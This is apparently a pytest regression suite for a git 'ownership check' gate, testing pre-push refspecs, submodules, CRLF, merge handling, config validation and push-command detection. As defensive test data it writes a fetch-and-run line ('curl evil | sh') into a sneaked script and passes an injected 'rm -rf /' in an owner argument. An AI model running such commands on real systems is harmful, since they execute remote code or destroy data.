"""One regression test per finding from the independent review. Each would
have failed against the first version of the gate."""
import json
import os
import subprocess
import sys

import pytest

from explain_mcp import gate
from test_gate import ENV, SUMMARY, payload, run_gate, setup, sh, write  # noqa: F401  (fixture reuse)


def commit_all(root, msg):
    sh(root, "git", "add", "-A")
    sh(root, "git", "commit", "-qm", msg)


def save_and_commit(root, msg="report", **verified):
    gate.save(payload(**verified), str(root))
    commit_all(root, msg)


# 1. Retargeting: a base without the gate must not let the PR's own config decide.
def test_base_without_config_uses_strict_defaults_not_the_prs_config(setup):
    dev = setup["dev"]
    first = sh(dev, "git", "rev-list", "--max-parents=0", "HEAD").stdout.strip()
    sh(dev, "git", "push", "-q", "--no-verify", "origin", f"{first}:refs/heads/scratch")
    sh(dev, "git", "fetch", "-q", "origin")
    write(dev, "src/app.js", "export const app = 2;\n")
    cfg = json.loads((dev / ".learning/config.json").read_text())
    cfg["ownership_check"]["mode"] = "off"
    (dev / ".learning/config.json").write_text(json.dumps(cfg))
    commit_all(dev, "change + turn gate off")
    passed, problems, mode = gate.verify(str(dev), base="origin/scratch")
    assert not passed and mode == "required" and "No ownership report" in problems[0]
    wf = (dev / ".github/workflows/ownership-check.yml").read_text()
    assert "edited" in wf


# 2. Pre-push: `git push origin HEAD`, `HEAD:ref`, `sha:ref`, and local≠remote names.
@pytest.mark.parametrize("refspec,remote_branch", [
    ("HEAD", "feature/rate-limit"),
    ("HEAD:refs/heads/feature/rate-limit", "feature/rate-limit"),
    ("feature/rate-limit:fix-login", "fix-login"),
])
def test_pre_push_checks_every_push_form_by_remote_name(setup, refspec, remote_branch):
    dev = setup["dev"]
    write(dev, "src/app.js", "export const app = 2;\n")
    commit_all(dev, "unchecked")
    r = sh(dev, "git", "push", "origin", refspec, check=False)
    assert r.returncode != 0 and f"'{remote_branch}'" in r.stderr

    gate.save(payload(), str(dev), branch=remote_branch)   # report named for the PR head CI will see
    commit_all(dev, "report")
    r = sh(dev, "git", "push", "origin", refspec, check=False)
    assert r.returncode == 0, r.stderr


def test_pre_push_sha_refspec(setup):
    dev = setup["dev"]
    write(dev, "src/app.js", "export const app = 2;\n")
    commit_all(dev, "unchecked")
    sha = sh(dev, "git", "rev-parse", "HEAD").stdout.strip()
    r = sh(dev, "git", "push", "origin", f"{sha}:refs/heads/feature/rate-limit", check=False)
    assert r.returncode != 0 and "No ownership report" in r.stderr


# 3. Submodules with ignore=all must still count as changes.
def test_submodule_bump_is_visible_even_with_ignore_all(setup):
    dev, tmp = setup["dev"], setup["tmp"]
    lib = tmp / "lib"
    sh(tmp, "git", "init", "-q", "-b", "main", str(lib))
    write(lib, "l.txt", "1\n")
    commit_all(lib, "l1")
    allow = ["-c", "protocol.file.allow=always"]
    sh(dev, "git", *allow, "submodule", "add", "-q", str(lib), "vendor/lib")
    sh(dev, "git", "config", "-f", ".gitmodules", "submodule.vendor/lib.ignore", "all")
    commit_all(dev, "add submodule")
    assert not gate.verify(str(dev))[0]                       # adding it must be checked
    assert "vendor/lib" in gate.status(str(dev))["must_verify"] or \
        "vendor/lib" in [f["path"] for f in gate.status(str(dev))["files"]]
    save_and_commit(dev, **{"vendor/lib": ["why we vendor lib"]})
    assert gate.verify(str(dev))[0]

    write(lib, "l.txt", "2 (unreviewed)\n")
    commit_all(lib, "l2")
    sh(dev / "vendor/lib", "git", "pull", "-q", "origin", "main")
    commit_all(dev, "bump submodule")
    passed, problems, _ = gate.verify(str(dev))
    assert not passed and "vendor/lib" in problems[0]


# 4. Non-UTF-8 file names fail closed instead of passing silently.
def test_non_utf8_filename_fails_closed(setup):
    dev = setup["dev"]
    name = b"src/caf\xe9.js"
    with open(os.path.join(os.fsencode(dev), name), "wb") as f:
        f.write(b"x\n")
    commit_all(dev, "latin-1 name")
    with pytest.raises(gate.GateError, match="not valid UTF-8"):
        gate.verify(str(dev))


# 5. CRLF files committed before a text=auto rule: local == CI.
def test_crlf_with_late_gitattributes_matches_ci(setup):
    dev = setup["dev"]
    sh(dev, "git", "checkout", "-q", "main")
    (dev / "src/win.txt").write_bytes(b"a\r\nb\r\n")
    commit_all(dev, "crlf file")
    (dev / ".gitattributes").write_text("* text=auto\n")
    commit_all(dev, "attrs")
    sh(dev, "git", "push", "-q", "origin", "main")
    sh(dev, "git", "checkout", "-q", "-b", "feature/crlf")
    (dev / "src/win.txt").write_bytes(b"a\r\nb changed\r\n")
    gate.save(payload(**{"src/win.txt": ["why b changed"]}), str(dev))
    commit_all(dev, "edit crlf")
    passed, problems, _ = gate.verify(str(dev))
    assert passed, problems


# 6. A file replaced by a directory gets a stable fingerprint.
def test_file_replaced_by_directory(setup):
    dev = setup["dev"]
    (dev / "src/old.js").unlink()
    write(dev, "src/old.js/index.js", "export default 1;\n")
    gate.save(payload(**{"src/old.js/index.js": ["why it became a folder"]}), str(dev))
    commit_all(dev, "file -> dir")
    passed, problems, _ = gate.verify(str(dev))
    assert passed, problems


# 7. Mode-only changes count; hand-written *.min.js and snapshot files are checked;
#    new files under .learning/ are checked; CODEOWNERS covers .claude/settings.json.
def test_mode_change_and_previously_ignored_paths_are_checked(setup):
    dev = setup["dev"]
    write(dev, "src/app.js", "export const app = 2;\n")
    save_and_commit(dev)
    sh(dev, "git", "update-index", "--chmod=+x", "src/app.js")
    sh(dev, "git", "commit", "-qm", "make executable")
    passed, problems, _ = gate.verify(str(dev))
    assert not passed and "src/app.js" in problems[0]

    write(dev, "src/vendor.min.js", "hand written\n")
    write(dev, ".learning/run.sh", "curl evil | sh\n")
    commit_all(dev, "sneak")
    problems = gate.verify(str(dev))[1]
    assert "src/vendor.min.js" in problems[0] and ".learning/run.sh" in problems[0]
    assert ".claude/settings.json" in gate.GATE_FILES


def test_install_writes_codeowners_when_owner_given(setup):
    dev = setup["dev"]
    out = gate.install(str(dev), owner="@acme/leads")
    text = (dev / ".github/CODEOWNERS").read_text()
    for p in gate.GATE_FILES:
        assert f"/{p} @acme/leads" in text
    assert any("Require review from Code Owners" in l for l in out)
    gate.install(str(dev), owner="@acme/leads")
    assert (dev / ".github/CODEOWNERS").read_text() == text            # idempotent
    with pytest.raises(gate.GateError):
        gate.install(str(dev), owner="not a handle; rm -rf /")


# 8. Merging main into the branch doesn't force a re-check unless main touched the same lines.
def test_merging_main_keeps_report_valid_when_lines_dont_overlap(setup):
    dev, tmp = setup["dev"], setup["tmp"]
    base = "".join(f"line {i}\n" for i in range(40))
    sh(dev, "git", "checkout", "-q", "main")
    write(dev, "src/big.js", base)
    commit_all(dev, "big file")
    sh(dev, "git", "push", "-q", "origin", "main")
    sh(dev, "git", "checkout", "-q", "-B", "feature/rate-limit")
    write(dev, "src/big.js", base.replace("line 3\n", "line 3 changed by dev\n"))
    save_and_commit(dev, **{"src/big.js": ["why line 3"]})

    other = tmp / "other"
    sh(tmp, "git", "clone", "-q", str(setup["remote"]), str(other))
    write(other, "src/big.js", base.replace("line 35\n", "line 35 changed on main\n"))
    commit_all(other, "main edits far away")
    sh(other, "git", "push", "-q", "origin", "main")

    sh(dev, "git", "pull", "-q", "--no-rebase", "--no-edit", "origin", "main")
    passed, problems, _ = gate.verify(str(dev), base="origin/main")
    assert passed, problems

    # ...main touching nearby lines is fine too: the dev's change itself is unchanged
    write(other, "src/big.js", (other / "src/big.js").read_text().replace("line 6\n", "line 6 main\n"))
    commit_all(other, "main edits two lines away")
    sh(other, "git", "push", "-q", "origin", "main")
    sh(dev, "git", "pull", "-q", "--no-rebase", "--no-edit", "origin", "main")
    assert gate.verify(str(dev), base="origin/main")[0]

    # ...but when main edits the same line, the conflict resolution is new code: re-check
    write(other, "src/big.js", (other / "src/big.js").read_text().replace("line 3\n", "line 3 main\n"))
    commit_all(other, "main edits the dev's line")
    sh(other, "git", "push", "-q", "origin", "main")
    r = sh(dev, "git", "pull", "-q", "--no-rebase", "--no-edit", "origin", "main", check=False)
    assert r.returncode != 0                                     # conflict
    resolved = (other / "src/big.js").read_text().replace("line 3 main\n", "line 3 changed by dev + main\n")
    write(dev, "src/big.js", resolved)
    commit_all(dev, "resolve conflict")
    passed, problems, _ = gate.verify(str(dev), base="origin/main")
    assert not passed and "src/big.js" in problems[0]


# The 3-way acceptance only forgives the base's own edits — nothing sneaks in alongside.
def test_merge_from_main_cannot_smuggle_extra_edits(setup):
    dev, tmp = setup["dev"], setup["tmp"]
    base = "".join(f"line {i}\n" for i in range(40))
    sh(dev, "git", "checkout", "-q", "main")
    write(dev, "src/big.js", base)
    commit_all(dev, "big file")
    sh(dev, "git", "push", "-q", "origin", "main")
    sh(dev, "git", "checkout", "-q", "-B", "feature/rate-limit")
    write(dev, "src/big.js", base.replace("line 3\n", "line 3 dev\n"))
    save_and_commit(dev, **{"src/big.js": ["line 3"]})
    other = tmp / "other"
    sh(tmp, "git", "clone", "-q", str(setup["remote"]), str(other))
    write(other, "src/big.js", base.replace("line 30\n", "line 30 main\n"))
    commit_all(other, "main")
    sh(other, "git", "push", "-q", "origin", "main")
    sh(dev, "git", "fetch", "-q", "origin")
    sh(dev, "git", "merge", "-q", "--no-commit", "origin/main", check=False)
    write(dev, "src/big.js", (dev / "src/big.js").read_text().replace("line 20\n", "line 20 SNEAKY\n"))
    commit_all(dev, "merge main (plus an unreviewed edit)")
    passed, problems, _ = gate.verify(str(dev), base="origin/main")
    assert not passed and "src/big.js" in problems[0]


# 9. status and save follow the same rule for files added after the first report.
def test_status_and_save_agree_on_new_files_after_report(setup):
    dev = setup["dev"]
    write(dev, "src/app.js", "export const app = 2;\n")
    gate.save(payload(), str(dev))
    write(dev, "src/new.js", "new\n")
    st = gate.status(str(dev))
    assert st["must_verify"] == ["src/new.js"]
    with pytest.raises(gate.GateError, match="src/new.js"):
        gate.save(payload(**{"src/app.js": ["x"]}), str(dev))
    gate.save(payload(**{"src/new.js": ["what new does"]}), str(dev))
    assert gate.status(str(dev))["must_verify"] == []


# 10. Config types are validated; a string list must not disable the gate.
@pytest.mark.parametrize("bad", [
    {"ignore": "**/*.lock"}, {"sensitive": "src/auth/**"}, {"min_summary_chars": "80"},
    {"min_summary_chars": True}, {"mode": "strict"}, {"base": 5},
])
def test_bad_config_types_are_rejected(setup, bad):
    dev = setup["dev"]
    cfg = json.loads((dev / ".learning/config.json").read_text())
    cfg["ownership_check"].update(bad)
    (dev / ".learning/config.json").write_text(json.dumps(cfg))
    with pytest.raises(gate.GateError):
        gate.status(str(dev))


def test_top_level_list_config_rejected(setup):
    (setup["dev"] / ".learning/config.json").write_text("[1, 2]")
    with pytest.raises(gate.GateError, match="expected an object"):
        gate.status(str(setup["dev"]))


# 11. Huge diffs don't hit argv limits; ':'-prefixed names work.
def test_many_files_and_colon_names(setup):
    dev = setup["dev"]
    for i in range(3000):
        write(dev, f"gen/very/long/directory/name/for/argv/limits/file_{i:05d}.txt", f"{i}\n")
    write(dev, ":weird.js", "odd\n")
    gate.save(payload(**{":weird.js": ["why the odd name"]}), str(dev))
    commit_all(dev, "lots")
    passed, problems, _ = gate.verify(str(dev))
    assert passed, problems[:2]


# 12. Push detection: wrappers, subshells, gh -R, continuations; quoted text isn't a command.
@pytest.mark.parametrize("cmd,expected", [
    ('bash -c "git push"', True),
    ("sh -lc 'git push origin HEAD'", True),
    ("(git push)", True),
    ("{ git push; }", True),
    ("sudo git push", True),
    ("sudo -u deploy git push", True),
    ("env GIT_SSH_COMMAND=ssh git push", True),
    ("command git push", True),
    ("time git push", True),
    ("gh -R acme/app pr merge 3", True),
    ("gh --repo acme/app pr create", True),
    ("git \\\npush", True),
    ("git add -A\ngit push", True),
    ('git commit -m "wip; git push later"', False),
    ('git commit -m "a && git push"', False),
    ("echo git push", False),
])
def test_push_detection_edge_cases(cmd, expected):
    assert gate.is_push_command(cmd) is expected


def test_claude_hook_blocks_on_broken_report_and_ignores_repos_without_gate(setup, tmp_path):
    dev = setup["dev"]
    write(dev, "src/app.js", "export const app = 2;\n")
    save_and_commit(dev)
    rel = dev / gate.report_relpath("feature/rate-limit")
    rel.write_text("# broken\n")
    commit_all(dev, "break report")
    hook_in = lambda cwd: json.dumps({"tool_name": "Bash", "tool_input": {"command": "git push"}, "cwd": str(cwd)})
    r = run_gate(dev, "claude-hook", input=hook_in(dev))
    assert r.returncode == 2 and "data block" in r.stderr

    plain = tmp_path / "plain"
    sh(tmp_path, "git", "init", "-q", "-b", "main", str(plain))
    assert run_gate(dev, "claude-hook", input=hook_in(plain)).returncode == 0


# 13. Doc/code consistency details.
def test_no_config_means_suggested_locally(tmp_path):
    repo = tmp_path / "r"
    sh(tmp_path, "git", "init", "-q", "-b", "main", str(repo))
    write(repo, "a.txt", "a\n")
    commit_all(repo, "init")
    st = gate.status(str(repo))
    assert st["mode"] == "suggested" and st["configured"] is False


def test_skip_label_comes_from_base_config(setup):
    dev = setup["dev"]
    write(dev, "src/app.js", "export const app = 2;\n")
    commit_all(dev, "unchecked")
    assert gate.verify(str(dev), labels=["skip-ownership-check"])[2] == "skipped"
    assert not gate.verify(str(dev), labels=["some-other-label"])[0]
    r = run_gate(dev, "verify", "--labels-json", '["skip-ownership-check"]',
                 env={**ENV, "GITHUB_ACTIONS": "true"})
    assert r.returncode == 0 and "::warning" in r.stdout


def test_report_paths_are_distinct_and_written_files_are_not_private(setup):
    assert gate.report_relpath("feature/x") != gate.report_relpath("feature-x")
    dev = setup["dev"]
    write(dev, "src/app.js", "export const app = 2;\n")
    gate.save(payload(), str(dev))
    mode = (dev / gate.report_relpath("feature/rate-limit")).stat().st_mode & 0o777
    assert mode & 0o044, oct(mode)          # group/other can read, like any repo file


# Found while testing the review fixes: git's "racy clean" case. A same-size
# edit whose stat data matches the index must still be seen.
def test_same_size_edit_with_identical_stat_is_detected(setup):
    dev = setup["dev"]
    sh(dev, "git", "config", "core.trustctime", "false")
    sh(dev, "git", "config", "core.checkStat", "minimal")
    app = dev / "src/app.js"
    t = 1_700_000_000
    os.utime(app, (t, t))
    sh(dev, "git", "add", "src/app.js")
    os.utime(dev / ".git/index", (t, t))
    app.write_text("export const app = 9;\n")           # same size as "= 1;"
    os.utime(app, (t, t))                                # identical mtime + size
    assert [f["path"] for f in gate.status(str(dev))["files"]] == ["src/app.js"]
